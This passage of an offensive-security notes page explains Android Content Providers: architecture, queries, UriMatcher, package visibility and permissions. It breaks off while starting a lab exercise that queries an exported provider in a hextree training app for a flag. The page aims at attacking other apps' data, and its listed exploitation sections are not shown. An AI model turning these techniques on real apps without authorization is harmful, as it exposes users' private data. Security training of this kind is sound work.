@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Content providers</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Content providers</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#overview" id="toc-overview">Overview</a>
+<ul>
+<li><a href="#how-to-use-it" id="toc-how-to-use-it">How to use it</a>
+<ul>
+<li><a href="#access" id="toc-access">Access</a></li>
+<li><a href="#implementation" id="toc-implementation">Implementation</a></li>
+</ul></li>
+<li><a href="#urimatcher" id="toc-urimatcher">UriMatcher</a></li>
+<li><a href="#package-visibility" id="toc-package-visibility">Package visibility</a>
+<ul>
+<li><a href="#declare-it-in-queries" id="toc-declare-it-in-queries">1. Declare it in <code>&lt;queries&gt;</code></a></li>
+<li><a href="#request-query_all_packages" id="toc-request-query_all_packages">2. Request <code>QUERY_ALL_PACKAGES</code></a></li>
+<li><a href="#automatic-visibility" id="toc-automatic-visibility">3. Automatic visibility</a></li>
+</ul></li>
+<li><a href="#androidpermission-androidreadpermission-androidwritepermission" id="toc-androidpermission-androidreadpermission-androidwritepermission">android:permission, android:readPermission, android:writePermission</a></li>
+</ul></li>
+<li><a href="#usage" id="toc-usage">Usage</a>
+<ul>
+<li><a href="#content-provider-query" id="toc-content-provider-query">Content provider query</a></li>
+<li><a href="#content-providers-urimatcher" id="toc-content-providers-urimatcher">Content providers &amp; UriMatcher</a></li>
+<li><a href="#general-example-to-dump-content-provider" id="toc-general-example-to-dump-content-provider">General example to dump content provider</a></li>
+</ul></li>
+<li><a href="#sharing-provider-access-granturipermissions" id="toc-sharing-provider-access-granturipermissions">Sharing Provider access: grantUriPermissions</a>
+<ul>
+<li><a href="#flag_grant_read_uri_permission-flag_grant_write_uri_permission" id="toc-flag_grant_read_uri_permission-flag_grant_write_uri_permission">FLAG_GRANT_READ_URI_PERMISSION &amp; FLAG_GRANT_WRITE_URI_PERMISSION</a></li>
+<li><a href="#granting-the-permission-with-an-intent" id="toc-granting-the-permission-with-an-intent">Granting the permission with an intent</a></li>
+<li><a href="#granting-the-permission-to-a-specific-package" id="toc-granting-the-permission-to-a-specific-package">Granting the permission to a specific package</a></li>
+</ul></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#sql-injection-in-content-providers" id="toc-sql-injection-in-content-providers">SQL Injection in content providers</a></li>
+<li><a href="#access-to-a-not-exported-provider-1-sqli" id="toc-access-to-a-not-exported-provider-1-sqli">Access to a not exported provider (1) (+ SQLi)</a></li>
+<li><a href="#access-to-a-not-exported-provider-2-sqli" id="toc-access-to-a-not-exported-provider-2-sqli">Access to a not exported provider (2) (+ SQLi)</a></li>
+<li><a href="#hijacking-content-provider-access-with-intent-reflection" id="toc-hijacking-content-provider-access-with-intent-reflection">Hijacking content provider access with intent reflection</a></li>
+<li><a href="#vulnerability-in-consuming-content-providers" id="toc-vulnerability-in-consuming-content-providers">Vulnerability in consuming Content Providers</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<h2 id="overview">Overview</h2>
+<p>A <a href="https://developer.android.com/reference/android/content/ContentProvider"><strong>Content Provider</strong></a> is one of the four fundamental components of an Android application (along with Activities, Services, and Broadcast Receivers).</p>
+<p>By default, Android uses a concept called “Application Sandboxing”. This means App A cannot access App B’s database or files directly. However, sometimes you want to share data. For example WhatsApp needs to access your phone’s <strong>Contacts</strong>.</p>
+<p>The <strong>Content Provider</strong> is the standard interface that connects data in one process with code running in another process.</p>
+<p><strong>Architecture</strong></p>
+<p>The architecture involves three main parts:</p>
+<ul>
+<li><strong>The Data Layer</strong>: The actual source of data (usually an SQLite database, but it can be files, JSON, etc.).</li>
+<li><strong>The Content Provider</strong>: The class that sits on top of the data. It exposes methods like insert, query, update, and delete.</li>
+<li><strong>The Content Resolver</strong>: The client (the app trying to get the data). It talks to the Provider using a specific address (URI).</li>
+</ul>
+<p><strong>The Content URI</strong></p>
+<p>To access data, you need a unique address called a URI (Uniform Resource Identifier). It looks like this: <code>content://com.example.app.provider/users/1</code></p>
+<ul>
+<li><code>content://</code>: The scheme (tells Android this is a Content Provider).</li>
+<li><code>com.example.app.provider</code>: The Authority. This acts like a domain name to identify which specific provider to call.</li>
+<li><code>users</code>: The Path. Indicates which table or type of data you want.</li>
+<li><code>1</code>: The ID. (Optional) Indicates the specific row you want.</li>
+</ul>
+<p><strong>Key Methods</strong></p>
+<p>A Content Provider must implement these six abstract methods:</p>
+<ul>
+<li><code>onCreate()</code>: Initialize the provider (e.g., open the database connection).</li>
+<li><code>query()</code>: Read data. Returns a Cursor object.</li>
+<li><code>insert()</code>: Add new data.</li>
+<li><code>update()</code>: Modify existing data.</li>
+<li><code>delete()</code>: Remove data.</li>
+<li><code>getType()</code>: Returns the MIME type of the data (used for handling file types).</li>
+</ul>
+<hr />
+<h3 id="how-to-use-it">How to use it</h3>
+<h4 id="access">Access</h4>
+<p>Imagine you want to read the User’s Contacts. You don’t query the database directly. You use the <code>ContentResolver</code>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 1. Define the URI for Contacts</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>Uri contactsUri <span class="op">=</span> ContactsContract<span class="op">.</span><span class="fu">Contacts</span><span class="op">.</span><span class="fu">CONTENT_URI</span><span class="op">;</span> <span class="co">// -&gt; content://com.android.contacts/contacts</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="co">// 2. Use the ContentResolver to query</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    contactsUri<span class="op">,</span> <span class="co">// The address</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">null</span><span class="op">,</span>        <span class="co">// Columns to return (null = all)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">null</span><span class="op">,</span>        <span class="co">// Selection criteria (WHERE clause)</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">null</span><span class="op">,</span>        <span class="co">// Selection arguments</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">null</span>         <span class="co">// Sort order</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="op">);</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="co">// 3. Iterate through the results</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>cursor <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> cursor<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">do</span> <span class="op">{</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> name <span class="op">=</span> cursor<span class="op">.</span><span class="fu">getString</span><span class="op">(</span>cursor<span class="op">.</span><span class="fu">getColumnIndex</span><span class="op">(</span>ContactsContract<span class="op">.</span><span class="fu">Contacts</span><span class="op">.</span><span class="fu">DISPLAY_NAME</span><span class="op">));</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;Contact&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">while</span> <span class="op">(</span>cursor<span class="op">.</span><span class="fu">moveToNext</span><span class="op">());</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    cursor<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Content Providers are identified and accessed through a <code>content://</code> URI. You can query this URI using <code>getContentResolver().query()</code>. The method returns data in a table-like structure, which can then be navigated using a <code>Cursor</code> object.</p>
+<h4 id="implementation">Implementation</h4>
+<p>If you want to share your app’s data with other apps, you must create a subclass of <code>ContentProvider</code>.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MyDataProvider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> SQLiteDatabase db<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">boolean</span> <span class="fu">onCreate</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Initialize your Database Helper here</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        DatabaseHelper dbHelper <span class="op">=</span> <span class="kw">new</span> <span class="fu">DatabaseHelper</span><span class="op">(</span><span class="fu">getContext</span><span class="op">());</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        db <span class="op">=</span> dbHelper<span class="op">.</span><span class="fu">getWritableDatabase</span><span class="op">();</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="op">(</span>db <span class="op">!=</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> projection<span class="op">,</span> <span class="bu">String</span> selection<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> selectionArgs<span class="op">,</span> <span class="bu">String</span> sortOrder<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Perform SQLite query</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> db<span class="op">.</span><span class="fu">query</span><span class="op">(</span><span class="st">&quot;tasks_table&quot;</span><span class="op">,</span> projection<span class="op">,</span> selection<span class="op">,</span> selectionArgs<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> sortOrder<span class="op">);</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Implement insert, update, delete similarly...</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Moreover, you must declare the provider in <code>AndroidManifest.xml</code></p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MyDataProvider&quot;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;com.example.myapp.provider&quot;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span> /&gt;</span></code></pre></div>
+<hr />
+<h3 id="urimatcher">UriMatcher</h3>
+<p>A <a href="https://developer.android.com/reference/android/content/UriMatcher">UriMatcher</a> is a utility class in Android that helps your app match incoming Uris against predefined patterns. It’s commonly used in ContentProviders to determine which type of request is being made and route it to the appropriate logic.</p>
+<p><strong>How it works</strong></p>
+<p>You create a <code>UriMatcher</code> and add URI patterns with integer constants:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="dt">int</span> USERS <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> <span class="dt">int</span> USER_ID <span class="op">=</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="kw">private</span> <span class="dt">static</span> <span class="dt">final</span> UriMatcher uriMatcher <span class="op">=</span> <span class="kw">new</span> <span class="fu">UriMatcher</span><span class="op">(</span>UriMatcher<span class="op">.</span><span class="fu">NO_MATCH</span><span class="op">);</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="op">{</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    uriMatcher<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span><span class="st">&quot;com.example.app&quot;</span><span class="op">,</span> <span class="st">&quot;users&quot;</span><span class="op">,</span> USERS<span class="op">);</span>       <span class="co">// Matches all users</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    uriMatcher<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span><span class="st">&quot;com.example.app&quot;</span><span class="op">,</span> <span class="st">&quot;users/#&quot;</span><span class="op">,</span> USER_ID<span class="op">);</span>   <span class="co">// Matches a specific user</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Then, inside the ContentProvider:</p>
+<pre><code>@Override
+public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
+    switch (uriMatcher.match(uri)) {
+        case USERS:
+            // return all users
+            break;
+        case USER_ID:
+            // return a specific user
+            break;
+        default:
+            throw new IllegalArgumentException(&quot;Unknown URI: &quot; + uri);
+    }
+}</code></pre>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<ul>
+<li><code>#</code> in the pattern matches a number.</li>
+<li><code>*</code> in the pattern matches any text.</li>
+<li><code>UriMatcher.NO_MATCH</code> is used as a default for unmatched URIs.</li>
+</ul>
+</blockquote>
+<h3 id="package-visibility">Package visibility</h3>
+<p>Since Android 11 (API 30), apps can’t see every installed app by default [<a href="https://developer.android.com/training/package-visibility">↗</a>]. If your app targets API 30+ and the target app isn’t visible to it, its providers can’t be resolved, <strong>even when they are <code>exported="true"</code></strong>:</p>
+<pre><code>Failed to find provider info for io.hextree.flag30</code></pre>
+<p>There are three ways to make the target app visible.</p>
+<h4 id="declare-it-in-queries">1. Declare it in <code>&lt;queries&gt;</code></h4>
+<p>Add a <code>&lt;queries&gt;</code> element to your app’s <code>AndroidManifest.xml</code>, outside <code>&lt;application&gt;</code>. You can declare the target app by package name, or the provider by its authority:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">queries</span>&gt;</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">&lt;!-- the whole app --&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">package</span><span class="ot"> android:name=</span><span class="st">&quot;com.example.otherapp&quot;</span> /&gt;</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">&lt;!-- a single provider --&gt;</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">provider</span><span class="ot"> android:authorities=</span><span class="st">&quot;com.example.otherapp.provider&quot;</span> /&gt;</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">queries</span>&gt;</span></code></pre></div>
+<h4 id="request-query_all_packages">2. Request <code>QUERY_ALL_PACKAGES</code></h4>
+<p>Makes every installed app visible. Google Play restricts this permission, but for a PoC it’s the quickest option:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">uses-permission</span><span class="ot"> android:name=</span><span class="st">&quot;android.permission.QUERY_ALL_PACKAGES&quot;</span> /&gt;</span></code></pre></div>
+<h4 id="automatic-visibility">3. Automatic visibility</h4>
+<p>An app becomes visible without any declaration when it interacts with yours first, for example when it:</p>
+<ul>
+<li>starts one of your activities or binds to one of your services;</li>
+<li>accesses one of your content providers;</li>
+<li>grants your app a URI permission on one of its providers (e.g. an intent with <code>FLAG_GRANT_READ_URI_PERMISSION</code>).</li>
+</ul>
+<p>The last case is common in Content Provider exploitation: if the target app hands you a URI with a grant, you can access it without <code>&lt;queries&gt;</code> (see <a href="#sharing-provider-access-granturipermissions">Sharing Provider access</a>).</p>
+<blockquote>
+<p><strong>Tip</strong>: <code>adb shell dumpsys package queries</code> shows which apps are visible to which.</p>
+</blockquote>
+<h3 id="androidpermission-androidreadpermission-androidwritepermission">android:permission, android:readPermission, android:writePermission</h3>
+<p>The <code>&lt;provider&gt;</code> tag offers three attributes that act as the main security gatekeepers for your data.</p>
+<p><code>android:permission</code> is the “all or nothing” attribute. It applies a single permission requirement to both reading and writing data.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MyProvider&quot;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;com.example.provider&quot;</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:permission=</span><span class="st">&quot;com.example.app.ACCESS_MY_DATA&quot;</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span> /&gt;</span></code></pre></div>
+<p>If a client app wants to interact with this provider in any way (<code>Query</code>, <code>Insert</code>, <code>Update</code>, or <code>Delete</code>), it must request and hold the <code>com.example.app.ACCESS_MY_DATA</code> permission in its Manifest.</p>
+<p><code>android:readPermission</code> &amp; <code>android:writePermission</code> attributes allow you to split the security model.</p>
+<ul>
+<li><code>android:readPermission</code> restricts <code>query()</code> operations (and <code>openFile()</code> in “<code>r</code>” mode).</li>
+<li><code>android:writePermission</code> restricts <code>insert()</code>, <code>update()</code>, <code>delete()</code> operations (and <code>openFile()</code> in “<code>w</code>” mode).</li>
+</ul>
+<p>Example configuration:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.SocialProvider&quot;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;com.example.social&quot;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:readPermission=</span><span class="st">&quot;android.permission.GLOBAL_SEARCH&quot;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:writePermission=</span><span class="st">&quot;com.example.social.WRITE_POSTS&quot;</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span> /&gt;</span></code></pre></div>
+<p>In this scenario any app with <code>GLOBAL_SEARCH</code> permission can read the posts, but only an app with <code>WRITE_POSTS</code> can create or delete them.</p>
+<hr />
+<h2 id="usage">Usage</h2>
+<h3 id="content-provider-query">Content provider query</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following ContentProvider:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag30Provider&quot;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.flag30&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag30Provider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span> <span class="co">// android.content.ContentProvider</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr<span class="op">,</span> <span class="bu">String</span> str<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr2<span class="op">,</span> <span class="bu">String</span> str2<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag30&quot;</span><span class="op">,</span> <span class="st">&quot;Flag30Provider.query(&#39;&quot;</span> <span class="op">+</span> uri<span class="op">.</span><span class="fu">getPath</span><span class="op">()</span> <span class="op">+</span> <span class="st">&quot;&#39;)&quot;</span><span class="op">);</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>uri<span class="op">.</span><span class="fu">getPath</span><span class="op">().</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;/success&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>        LogHelper logHelper <span class="op">=</span> <span class="kw">new</span> <span class="fu">LogHelper</span><span class="op">(</span><span class="fu">getContext</span><span class="op">());</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Cursor</span> cursorQuery <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">dbHelper</span><span class="op">.</span><span class="fu">getReadableDatabase</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>FlagDatabaseHelper<span class="op">.</span><span class="fu">TABLE_FLAG</span><span class="op">,</span> strArr<span class="op">,</span> <span class="st">&quot;name=? AND visible=1&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;flag30&quot;</span><span class="op">},</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> str2<span class="op">);</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>        cursorQuery<span class="op">.</span><span class="fu">setNotificationUri</span><span class="op">(</span><span class="fu">getContext</span><span class="op">().</span><span class="fu">getContentResolver</span><span class="op">(),</span> uri<span class="op">);</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>        <span class="fu">success</span><span class="op">(</span>logHelper<span class="op">);</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> cursorQuery<span class="op">;</span></span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To retrieve the flag, you simply need to perform a query as shown below:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>Uri uri <span class="op">=</span> Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag30/success&quot;</span><span class="op">);</span></span>
